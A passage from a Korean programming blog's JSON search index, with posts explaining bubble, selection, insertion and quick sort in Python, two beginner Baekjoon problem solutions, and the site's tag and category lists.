선택, 삽입 정렬","text":"알고리즘 연습 방법 문제를 읽고 분석한다. 간단하게 테스트용으로 매우 간단한 경우부터 복잡한 경우 순서대로 생각해보면서, 연습장과 펜을 이용하여 알고리즘을 생각해본다. 가능한 알고리즘이 보인다면, 구현할 알고리즘을 세부 항목으로 나누고, 문장으로 세부 항목을 나누어서 적어본다. 코드화하기 위해, 데이터 구조 또는 사용할 변수를 정리한다. 각 문장을 코드 레벨로 적는다. 데이터 구조 또는 사용할 변수가 코드에 따라 어떻게 변하는지 손으로 적으면서, 임의 데이터로 코드가 정상 동작하는지를 연습장과 펜으로 검증한다. 정렬(Sorting) 이란?어떤 데이터들이 주어졌을 때 이를 정해진 순서대로 나열하는 것 다양한 정렬 알고리즘 이해를 통해, 동일한 문제에 대해 다양한 알고리즘이 고안될 수 있음을 이해하고, 각 알고리즘간 성능 비교를 통해, 알고리즘 성능 분석에 대해서도 이해할 수 있음. 버블 정렬(Bubble sort) 두 인접한 데이터를 비교해서, 앞에 있는 데이터가 뒤에 있는 데이터보다 크면, 자리를 바꾸는 정렬 알고리즘 Code12345678910111213141516import randomdef bubble_sort(data): for index in range(len(data)): swap = False for index2 in range(len(data) - index - 1): if data[index2] &gt; data[index2 + 1]: data[index2], data[index2 + 1] = data[index2 + 1], data[index2] swap = True if swap == False: break return dataif __name__ == '__main__': data_list = random.sample(range(100), 10) print(bubble_sort(data_list)) 선택 정렬(Selection sort) 주어진 리스트 중에 최소값을 찾는다. 그 값을 맨 앞에 위치한 값과 교체한다(패스(pass)). 맨 처음 위치를 뺀 나머지 리스트를 같은 방법으로 교체한다. 위 순서를 반복하여 정렬하는 알고리즘 Code1234567891011121314import randomdef select_sort(data): for stand in range(len(data)-1): lowest = stand for index in range(stand+1, len(data)): if data[index] &lt; data[lowest]: lowest = index data[lowest], data[stand] = data[stand], data[lowest] return dataif __name__ == '__main__': data_list = random.sample(range(100), 10) print(select_sort(data_list)) 삽입 정렬(Insertion sort) 자료 배열의 모든 요소를 앞에서부터 차례대로 이미 정렬된 배열 부분과 비교하여, 자신의 위치를 찾아 삽입함으로써 정렬을 완성하는 알고리즘 Code1234567891011121314import randomdef insertion_sort(data): for index in range(len(data)-1): for index2 in range(index+1, 0, -1): if data[index2] &lt; data[index2-1]: data[index2], data[index2-1] = data[index2-1], data[index2] else: break return dataif __name__ == '__main__': data_list = random.sample(range(100), 10) print(insertion_sort(data_list))","link":"/2021/02/20/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EC%A0%95%EB%A0%AC-%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EA%B0%9C%EC%9A%94/"},{"title":"알고리즘 정리 - 퀵 정렬","text":"퀵 정렬(Quick Sort) 기준점(pivot)을 정해서, 기준점보다 작은 데이터는 왼쪽(left), 큰 데이터는 오른쪽(right)으로 모으는 함수를 작성함.각 왼쪽(left), 오른쪽(right)은 재귀용법을 사용해서 다시 동일 함수를 호출하여 위 작업을 반복함.함수는 왼쪽(left) + 기준점(pivot) + 오른쪽(right)을 리턴함. Code12345678910111213141516171819import randomdef qsort(data): if len(data) &lt;= 1: return data left, right = list(), list() pivot = data[0] for index in range(1, len(data)): if pivot &gt; data[index]: left.append(data[index]) else: right.append(data[index]) return qsort(left) + [pivot] + qsort(right)data_list = random.sample(range(100), 10)print(qsort(data_list)) 알고리즘 분석병합 정렬과 유사, 시간 복잡도는 O(n log n) 단, 최악의 경우 pivot이 가장 크거나 작으면 모든 데이터를와 비교하게 된다. O(n2)","link":"/2021/02/24/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%ED%80%B5-%EC%A0%95%EB%A0%AC/"},{"title":"백준 브론즈 2741번 문제","text":"N 찍기자연수 N이 주어졌을 때, 1부터 N까지 한 줄에 하나씩 출력하는 프로그램을 작성하시오. 문제 풀이12n = int(input())[print(i) for i in range(1, n+1)] 풀이 설명List Comprehention을 이용하여 풀이하였다.","link":"/2021/03/18/%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-2741%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 2742번 문제","text":"기찍 N자연수 N이 주어졌을 때, N부터 1까지 한 줄에 하나씩 출력하는 프로그램을 작성하시오. 문제 풀이12n = int(input())[print(i) for i in range(n, 0, -1)] 풀이 설명range 함수에 대해서 알고 있어야 쉽게 풀 수 있는 문제이다.","link":"/2021/03/18/%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-2742%EB%B2%88-%EB%AC%B8%EC%A0%9C/"}],"tags":[{"name":"백준","slug":"백준","link":"/tags/%EB%B0%B1%EC%A4%80/"},{"name":"백준 브론즈4","slug":"백준-브론즈4","link":"/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/"},{"name":"OWASP","slug":"OWASP","link":"/tags/OWASP/"},{"name":"BeeBox","slug":"BeeBox","link":"/tags/BeeBox/"},{"name":"Double Linked List","slug":"Double-Linked-List","link":"/tags/Double-Linked-List/"},{"name":"Linked List","slug":"Linked-List","link":"/tags/Linked-List/"},{"name":"Hash Table","slug":"Hash-Table","link":"/tags/Hash-Table/"},{"name":"Queue","slug":"Queue","link":"/tags/Queue/"},{"name":"Stack","slug":"Stack","link":"/tags/Stack/"},{"name":"Tree","slug":"Tree","link":"/tags/Tree/"},{"name":"Dreamhack","slug":"Dreamhack","link":"/tags/Dreamhack/"},{"name":"백준 브론즈5","slug":"백준-브론즈5","link":"/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885/"},{"name":"백준 브론즈3","slug":"백준-브론즈3","link":"/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%883/"},{"name":"브론즈4","slug":"브론즈4","link":"/tags/%EB%B8%8C%EB%A1%A0%EC%A6%884/"},{"name":"백준 브론즈2","slug":"백준-브론즈2","link":"/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%882/"},{"name":"backjoon bronze4","slug":"backjoon-bronze4","link":"/tags/backjoon-bronze4/"},{"name":"backjoon","slug":"backjoon","link":"/tags/backjoon/"},{"name":"백준 실버5","slug":"백준-실버5","link":"/tags/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%845/"},{"name":"백준 실버4","slug":"백준-실버4","link":"/tags/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%844/"},{"name":"백준 실버3","slug":"백준-실버3","link":"/tags/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%843/"},{"name":"보안뉴스","slug":"보안뉴스","link":"/tags/%EB%B3%B4%EC%95%88%EB%89%B4%EC%8A%A4/"},{"name":"다크웹","slug":"다크웹","link":"/tags/%EB%8B%A4%ED%81%AC%EC%9B%B9/"},{"name":"알고리즘 복잡도","slug":"알고리즘-복잡도","link":"/tags/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EB%B3%B5%EC%9E%A1%EB%8F%84/"},{"name":"Big-O","slug":"Big-O","link":"/tags/Big-O/"},{"name":"동적 계획법","slug":"동적-계획법","link":"/tags/%EB%8F%99%EC%A0%81-%EA%B3%84%ED%9A%8D%EB%B2%95/"},{"name":"분할 정복","slug":"분할-정복","link":"/tags/%EB%B6%84%ED%95%A0-%EC%A0%95%EB%B3%B5/"},{"name":"재귀함수","slug":"재귀함수","link":"/tags/%EC%9E%AC%EA%B7%80%ED%95%A8%EC%88%98/"},{"name":"Bubble Sort","slug":"Bubble-Sort","link":"/tags/Bubble-Sort/"},{"name":"Selection Sort","slug":"Selection-Sort","link":"/tags/Selection-Sort/"},{"name":"Insertion Sort","slug":"Insertion-Sort","link":"/tags/Insertion-Sort/"},{"name":"퀵 정렬","slug":"퀵-정렬","link":"/tags/%ED%80%B5-%EC%A0%95%EB%A0%AC/"}],"categories":[{"name":"알고리즘","slug":"알고리즘","link":"/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/"},{"name":"Security","slug":"Security","link":"/categories/Security/"},{"name":"백준","slug":"알고리즘/백준","link":"/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/"},{"name":"Web","slug":"Security/Web","link":"/categories/Security/Web/"},{"name":"Data Structure","slug":"Data-Structure","link":"/categories/Data-Structure/"},{"name":"브론즈4","slug":"알고리즘/백준/브론즈4","link":"/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B8%8C%EB%A1%A0%EC%A6%884/"},{"name":"BeeBox","slug":"Security/Web/BeeBox","link":"/categories/Security/Web/BeeBox/"},{"name":"OWASP TOP 10","slug":"Security/Web/OWASP-TOP-10","link":"/categories/Security/Web/OWASP-TOP-10/"},{"name":"Dreamhack","slug":"Security/Dreamhack","link":"/categories/Security/Dreamhack/"},{"name":"브론즈5","slug":"알고리즘/백준/브론즈5","link":"/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B8%8C%EB%A1%A0%EC%A6%885/"},{"name":"브론즈","slug":"알고리즘/백준/브론즈","link":"/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B8%8C%EB%A1%A0%EC%A6%88/"},{"name":"실버","slug":"알고리즘/백준/실버","link":"/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EC%8B%A4%EB%B2%84/"},{"name":"보안뉴스","slug":"Security/보안뉴스","link":"/categories/Security/%EB%B3%B4%EC%95%88%EB%89%B4%EC%8A%A4/"},{"name":"Basic","slug":"알고리즘/Basic","link":"/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/Basic/"}]}